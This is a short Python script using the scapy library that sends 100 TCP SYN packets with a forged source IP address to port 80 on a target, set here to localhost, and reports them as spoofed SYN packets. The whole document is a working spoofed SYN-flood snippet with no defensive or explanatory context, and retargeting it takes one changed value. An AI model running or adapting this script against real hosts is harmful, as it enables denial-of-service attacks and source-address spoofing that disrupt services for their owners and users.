from scapy.all import send, IP, TCP
import random

target_ip = "127.0.0.1"
for i in range(100):
    src_ip = "10.0.0.99"
    pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=80, flags="S")
    send(pkt, verbose=0)
print("Sent 100 spoofed SYN packets")